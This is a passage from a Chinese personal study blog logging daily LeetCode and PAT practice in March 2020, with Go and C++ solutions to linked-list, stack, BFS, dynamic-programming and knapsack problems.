class="keyword">for</span> i := <span class="number">0</span>; i &lt; n; i++ &#123;</span><br><span class="line">		fmt.Scanf(<span class="string">&quot;%d-&gt;&quot;</span>, &amp;head.Val)</span><br><span class="line">		head.Next = <span class="built_in">new</span>(ListNode) <span class="comment">//先初始化，在next</span></span><br><span class="line">		<span class="keyword">if</span> i == <span class="number">4</span> &#123;</span><br><span class="line">			<span class="keyword">break</span></span><br><span class="line">		&#125;</span><br><span class="line">		head = head.Next</span><br><span class="line">	&#125;</span><br><span class="line">	head = <span class="literal">nil</span></span><br><span class="line">	<span class="comment">//fmt.Printf(&quot;%p\n&quot;, root)</span></span><br><span class="line">	<span class="comment">// for i := 0; i &lt; n; i++ &#123;</span></span><br><span class="line">	<span class="comment">// 	fmt.Printf(&quot;%d-&gt;&quot;, root.Val)</span></span><br><span class="line">	<span class="comment">// 	root = root.Next</span></span><br><span class="line">	<span class="comment">// &#125;</span></span><br><span class="line">	<span class="keyword">var</span> pre *ListNode = reverseList(root)</span><br><span class="line">	pre = pre.Next</span><br><span class="line">	<span class="keyword">for</span> i := <span class="number">0</span>; i &lt; n; i++ &#123;</span><br><span class="line">		fmt.Printf(<span class="string">&quot;%d-&gt;&quot;</span>, pre.Val)</span><br><span class="line">		pre = pre.Next</span><br><span class="line">	&#125;</span><br><span class="line">	fmt.Printf(<span class="string">&quot;NULL\n&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="2020-3-7"><a href="#2020-3-7" class="headerlink" title="2020/3/7"></a>2020/3/7</h3><h4 id="leetcode-225-用队列实现栈-Go"><a href="#leetcode-225-用队列实现栈-Go" class="headerlink" title="leetcode 225. 用队列实现栈_Go"></a>leetcode 225. 用队列实现栈_Go</h4><p>GO本身不支持stack啥的，那切片实现一下也不错，学到了一些姿势，我自己想的是用两个切边操作一下肯定是可以实现一个栈的</p>
<p>大家也可以画个图，画着画着就出来了</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">type</span> MyStack <span class="keyword">struct</span> &#123;</span><br><span class="line">    Queue1 []<span class="keyword">int</span></span><br><span class="line">    Queue2 []<span class="keyword">int</span></span><br><span class="line">    top <span class="keyword">int</span> <span class="comment">//栈顶元素</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/** Initialize your data structure here. */</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Constructor</span><span class="params">()</span> <span class="title">MyStack</span></span> &#123;</span><br><span class="line">    <span class="keyword">var</span> mystack MyStack</span><br><span class="line">    <span class="keyword">return</span> mystack</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/** Push element x onto stack. */</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(this *MyStack)</span> <span class="title">Push</span><span class="params">(x <span class="keyword">int</span>)</span></span>  &#123;</span><br><span class="line">    this.Queue1=<span class="built_in">append</span>(this.Queue1,x)</span><br><span class="line">    this.top=x</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/** Removes the element on top of the stack and returns that element. */</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(this *MyStack)</span> <span class="title">Pop</span><span class="params">()</span> <span class="title">int</span></span> &#123;</span><br><span class="line">    <span class="keyword">var</span> length <span class="keyword">int</span> = <span class="built_in">len</span>(this.Queue1)</span><br><span class="line">    <span class="comment">//除了要出栈的元素全部存到另一个空切片Queue2中去</span></span><br><span class="line">    <span class="keyword">for</span> i:=<span class="number">0</span>;i&lt;length<span class="number">-1</span>;i++&#123;</span><br><span class="line">        temp:=this.Queue1[<span class="number">0</span>]</span><br><span class="line">        this.top = temp</span><br><span class="line">        this.Queue1 = this.Queue1[<span class="number">1</span>:]</span><br><span class="line">        this.Queue2 = <span class="built_in">append</span>(this.Queue2, temp)</span><br><span class="line">    &#125;</span><br><span class="line">    target := this.Queue1[<span class="number">0</span>]</span><br><span class="line">    <span class="comment">//交换队列，并让辅助队列变空</span></span><br><span class="line">    this.Queue1 = this.Queue2</span><br><span class="line">    this.Queue2 = <span class="built_in">make</span>([]<span class="keyword">int</span>, <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">return</span> target</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/** Get the top element. */</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(this *MyStack)</span> <span class="title">Top</span><span class="params">()</span> <span class="title">int</span></span> &#123;</span><br><span class="line">    <span class="keyword">return</span> this.top</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/** Returns whether the stack is empty. */</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(this *MyStack)</span> <span class="title">Empty</span><span class="params">()</span> <span class="title">bool</span></span> &#123;</span><br><span class="line">    <span class="keyword">var</span> result <span class="keyword">int</span> = <span class="built_in">len</span>(this.Queue1)</span><br><span class="line">    <span class="keyword">return</span> result==<span class="number">0</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Your MyStack object will be instantiated and called as such:</span></span><br><span class="line"><span class="comment"> * obj := Constructor();</span></span><br><span class="line"><span class="comment"> * obj.Push(x);</span></span><br><span class="line"><span class="comment"> * param_2 := obj.Pop();</span></span><br><span class="line"><span class="comment"> * param_3 := obj.Top();</span></span><br><span class="line"><span class="comment"> * param_4 := obj.Empty();</span></span><br><span class="line"><span class="comment"> */</span></span><br></pre></td></tr></table></figure>

<h3 id="2020-3-8"><a href="#2020-3-8" class="headerlink" title="2020/3/8"></a>2020/3/8</h3><h4 id="PAT-A1007-C"><a href="#PAT-A1007-C" class="headerlink" title="PAT A1007_C"></a>PAT A1007_C</h4><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;math.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;set&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;map&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stack&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;queue&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="comment">//PAT a1007</span></span><br><span class="line"><span class="comment">//求最长子序列</span></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> maxn=<span class="number">10010</span>;</span><br><span class="line"><span class="keyword">int</span> dp[maxn],temp[maxn],s[maxn]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line"><span class="keyword">bool</span> flag=<span class="literal">false</span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> n;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;n);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;n;i++)&#123;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;temp[i]);</span><br><span class="line">        <span class="keyword">if</span>(temp[i]&gt;=<span class="number">0</span>) flag=<span class="literal">true</span>;</span><br><span class="line">        dp[i]=<span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(!flag)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;0 %d %d\n&quot;</span>,temp[<span class="number">0</span>],temp[n<span class="number">-1</span>]);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    dp[<span class="number">0</span>]=temp[<span class="number">0</span>];</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;n;i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(dp[i<span class="number">-1</span>]+temp[i]&gt;temp[i])&#123;</span><br><span class="line">            dp[i]=temp[i]+dp[i<span class="number">-1</span>];</span><br><span class="line">            s[i]=s[i<span class="number">-1</span>];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            dp[i]=temp[i];</span><br><span class="line">            s[i]=i;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">int</span> k=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;n;i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(dp[i]&gt;dp[k])&#123;</span><br><span class="line">            k=i;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d %d %d\n&quot;</span>,dp[k],temp[s[k]],temp[k]);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h4 id="PAT-A1045-C"><a href="#PAT-A1045-C" class="headerlink" title="PAT A1045_C"></a>PAT A1045_C</h4><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;math.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;set&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;map&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stack&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;queue&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="comment">//PAT A1045</span></span><br><span class="line"><span class="comment">//LIS</span></span><br><span class="line"><span class="comment">//可以在输入数据的时候就直接剔除不喜欢的颜色，从而简化操作</span></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> maxc=<span class="number">210</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> maxn=<span class="number">10010</span>;</span><br><span class="line"><span class="keyword">int</span> HashTable[maxc];</span><br><span class="line"><span class="keyword">int</span> A[maxn],dp[maxn];</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> n,m,x;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d%d&quot;</span>,&amp;n,&amp;m);</span><br><span class="line">    <span class="built_in">fill</span>(HashTable,HashTable+maxc,<span class="number">-1</span>);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;m;i++)&#123;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;x);</span><br><span class="line">        HashTable[x]=i;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">int</span> num=<span class="number">0</span>,L;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;L);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;L;i++)&#123;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;x);</span><br><span class="line">        <span class="keyword">if</span>(HashTable[x]&gt;=<span class="number">0</span>)</span><br><span class="line">            A[num++]=HashTable[x];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">int</span> ans=<span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;num;i++)&#123;</span><br><span class="line">        dp[i]=<span class="number">1</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span>;j&lt;i;j++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(A[j]&lt;=A[i]&amp;&amp;dp[j]+<span class="number">1</span>&gt;dp[i])&#123;</span><br><span class="line">                dp[i]=dp[j]+<span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        ans=<span class="built_in">max</span>(ans,dp[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>,ans);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h4 id="PAT-A1040-C"><a href="#PAT-A1040-C" class="headerlink" title="PAT A1040_C"></a>PAT A1040_C</h4><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;math.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;set&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;map&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stack&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;queue&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="comment">//PAT A1040</span></span><br><span class="line"><span class="comment">//最长回文串</span></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> maxn=<span class="number">1010</span>;</span><br><span class="line">string s;</span><br><span class="line"><span class="keyword">int</span> dp[maxn][maxn];</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">getline</span>(cin,s);</span><br><span class="line">    <span class="comment">//cout&lt;&lt;s&lt;&lt;endl;</span></span><br><span class="line">    <span class="keyword">int</span> len=s.<span class="built_in">length</span>(),ans=<span class="number">1</span>;</span><br><span class="line">    <span class="built_in">fill</span>(dp[<span class="number">0</span>],dp[<span class="number">0</span>]+maxn*maxn,<span class="number">0</span>);</span><br><span class="line">    <span class="comment">//边界</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;len;i++)&#123;</span><br><span class="line">        dp[i][i]=<span class="number">1</span>;</span><br><span class="line">        <span class="keyword">if</span>(i&lt;len<span class="number">-1</span>)&#123;</span><br><span class="line">            <span class="keyword">if</span>(s[i]==s[i+<span class="number">1</span>])&#123;</span><br><span class="line">                dp[i][i+<span class="number">1</span>]=<span class="number">1</span>;</span><br><span class="line">                ans=<span class="number">2</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//状态转移方程</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> L=<span class="number">3</span>;L&lt;=len;L++)&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i+L<span class="number">-1</span>&lt;len;i++)&#123;</span><br><span class="line">            <span class="keyword">int</span> j=i+L<span class="number">-1</span>;</span><br><span class="line">            <span class="keyword">if</span>(s[i]==s[j]&amp;&amp;dp[i+<span class="number">1</span>][j<span class="number">-1</span>]==<span class="number">1</span>)&#123;</span><br><span class="line">                dp[i][j]=<span class="number">1</span>;</span><br><span class="line">                ans=L;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>,ans);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h4 id="leetcode-994-腐烂的橘子-Go"><a href="#leetcode-994-腐烂的橘子-Go" class="headerlink" title="leetcode 994. 腐烂的橘子_Go"></a>leetcode 994. 腐烂的橘子_Go</h4><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">orangesRotting</span><span class="params">(grid [][]<span class="keyword">int</span>)</span> <span class="title">int</span></span> &#123;</span><br><span class="line">	<span class="keyword">if</span> <span class="built_in">len</span>(grid) == <span class="number">0</span> &#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">var</span> w, h <span class="keyword">int</span> = <span class="built_in">len</span>(grid), <span class="built_in">len</span>(grid[<span class="number">0</span>]) <span class="comment">// 行、列</span></span><br><span class="line">	<span class="keyword">var</span> health <span class="keyword">int</span> = <span class="number">0</span></span><br><span class="line">	<span class="keyword">var</span> queue = [][]<span class="keyword">int</span>&#123;&#125;</span><br><span class="line">	<span class="comment">// 读入图表</span></span><br><span class="line">	<span class="keyword">for</span> i := <span class="number">0</span>; i &lt; w; i++ &#123;</span><br><span class="line">		<span class="keyword">for</span> j := <span class="number">0</span>; j &lt; h; j++ &#123;</span><br><span class="line">			<span class="keyword">if</span> grid[i][j] == <span class="number">2</span> &#123;</span><br><span class="line">				queue = <span class="built_in">append</span>(queue, []<span class="keyword">int</span>&#123;i, j&#125;)</span><br><span class="line">			&#125; <span class="keyword">else</span> <span class="keyword">if</span> grid[i][j] == <span class="number">1</span> &#123;</span><br><span class="line">				health++</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">// BFS 迷宫走法</span></span><br><span class="line">	<span class="keyword">var</span> time <span class="keyword">int</span> = <span class="number">0</span></span><br><span class="line">	<span class="keyword">for</span> <span class="built_in">len</span>(queue) &gt; <span class="number">0</span> &amp;&amp; health &gt; <span class="number">0</span> &#123;</span><br><span class="line">		time++</span><br><span class="line">		length := <span class="built_in">len</span>(queue)</span><br><span class="line">		<span class="comment">// 去除第一个节点</span></span><br><span class="line">		<span class="keyword">for</span> i := <span class="number">0</span>; i &lt; length; i++ &#123;</span><br><span class="line">			dot := queue[<span class="number">0</span>]</span><br><span class="line">			x, y := dot[<span class="number">0</span>], dot[<span class="number">1</span>]</span><br><span class="line">			queue = queue[<span class="number">1</span>:]</span><br><span class="line">			<span class="comment">//上边的健康</span></span><br><span class="line">			<span class="keyword">if</span> y<span class="number">-1</span> &gt;= <span class="number">0</span> &amp;&amp; grid[x][y<span class="number">-1</span>] == <span class="number">1</span> &#123;</span><br><span class="line">				grid[x][y<span class="number">-1</span>] = <span class="number">2</span></span><br><span class="line">				health--</span><br><span class="line">				queue = <span class="built_in">append</span>(queue, []<span class="keyword">int</span>&#123;x, y - <span class="number">1</span>&#125;)</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="comment">//下边的健康</span></span><br><span class="line">			<span class="keyword">if</span> y+<span class="number">1</span> &lt; h &amp;&amp; grid[x][y+<span class="number">1</span>] == <span class="number">1</span> &#123;</span><br><span class="line">				grid[x][y+<span class="number">1</span>] = <span class="number">2</span></span><br><span class="line">				health--</span><br><span class="line">				queue = <span class="built_in">append</span>(queue, []<span class="keyword">int</span>&#123;x, y + <span class="number">1</span>&#125;)</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="comment">//左边的健康</span></span><br><span class="line">			<span class="keyword">if</span> x<span class="number">-1</span> &gt;= <span class="number">0</span> &amp;&amp; grid[x<span class="number">-1</span>][y] == <span class="number">1</span> &#123;</span><br><span class="line">				grid[x<span class="number">-1</span>][y] = <span class="number">2</span></span><br><span class="line">				health--</span><br><span class="line">				queue = <span class="built_in">append</span>(queue, []<span class="keyword">int</span>&#123;x - <span class="number">1</span>, y&#125;)</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="comment">//右边的健康</span></span><br><span class="line">			<span class="keyword">if</span> x+<span class="number">1</span> &lt; w &amp;&amp; grid[x+<span class="number">1</span>][y] == <span class="number">1</span> &#123;</span><br><span class="line">				grid[x+<span class="number">1</span>][y] = <span class="number">2</span></span><br><span class="line">				health--</span><br><span class="line">				queue = <span class="built_in">append</span>(queue, []<span class="keyword">int</span>&#123;x + <span class="number">1</span>, y&#125;)</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> health &gt; <span class="number">0</span> &#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="number">-1</span></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> time</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	<span class="keyword">var</span> grid = [][]<span class="keyword">int</span>&#123;&#123;<span class="number">2</span>, <span class="number">1</span>, <span class="number">1</span>&#125;, &#123;<span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>&#125;, &#123;<span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>&#125;&#125;</span><br><span class="line">	result := orangesRotting(grid)</span><br><span class="line">	fmt.Println(result)</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="2020-3-9"><a href="#2020-3-9" class="headerlink" title="2020/3/9"></a>2020/3/9</h3><p>今天要忙的事情好多，就做个水题吧，即将毕业的真痛苦</p>
<h4 id="leetcode-1103-分糖果-Go"><a href="#leetcode-1103-分糖果-Go" class="headerlink" title="leetcode 1103. 分糖果||_Go"></a>leetcode 1103. 分糖果||_Go</h4><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">distributeCandies</span><span class="params">(candies <span class="keyword">int</span>, num_people <span class="keyword">int</span>)</span> []<span class="title">int</span></span> &#123;</span><br><span class="line">    ans:=<span class="built_in">make</span>([]<span class="keyword">int</span>,num_people)</span><br><span class="line">    add:=<span class="number">1</span></span><br><span class="line">    idx:=<span class="number">0</span></span><br><span class="line">    candies-=<span class="number">1</span></span><br><span class="line">    <span class="keyword">for</span> candies&gt;<span class="number">0</span>&#123;</span><br><span class="line">        ans[idx]+=add</span><br><span class="line">        add++</span><br><span class="line">        candies-=add</span><br><span class="line">        idx=(idx+<span class="number">1</span>)%num_people</span><br><span class="line">    &#125;</span><br><span class="line">    ans[idx]+=candies+add</span><br><span class="line">    <span class="keyword">return</span> ans</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="2020-3-10"><a href="#2020-3-10" class="headerlink" title="2020/3/10"></a>2020/3/10</h3><h4 id="PAT-A1068-C"><a href="#PAT-A1068-C" class="headerlink" title="PAT A1068_C"></a>PAT A1068_C</h4><p>背包问题冲冲冲</p>
<p>一个0，1背包就学了好久</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;math.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;set&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;map&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stack&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;queue&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="comment">//PAT A1068</span></span><br><span class="line"><span class="comment">// 0/1 背包问题</span></span><br><span class="line"><span class="comment">// 特色是不光要求值，还需要把选择的序列写出来</span></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> maxn=<span class="number">10010</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> maxc=<span class="number">110</span>;</span><br><span class="line"><span class="keyword">int</span> dp[maxc]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line"><span class="keyword">int</span> c[maxn];</span><br><span class="line"><span class="keyword">bool</span> flag[maxn];</span><br><span class="line"><span class="keyword">bool</span> choice[maxn][maxc];</span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">cmp</span><span class="params">(<span class="keyword">int</span> a,<span class="keyword">int</span> b)</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> a&gt;b;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> n,m;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d%d&quot;</span>,&amp;n,&amp;m);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)&#123;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;c[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">sort</span>(c+<span class="number">1</span>,c+n+<span class="number">1</span>,cmp); <span class="comment">//从小到大排序</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> v=m;v&gt;=c[i];v--)&#123;</span><br><span class="line">            <span class="keyword">if</span>(dp[v]&lt;=dp[v-c[i]]+c[i])&#123;</span><br><span class="line">                dp[v]=dp[v-c[i]]+c[i];</span><br><span class="line">                choice[i][v]=<span class="number">1</span>;   <span class="comment">//容量是v时，放入第i件物品</span></span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> choice[i][v]=<span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">   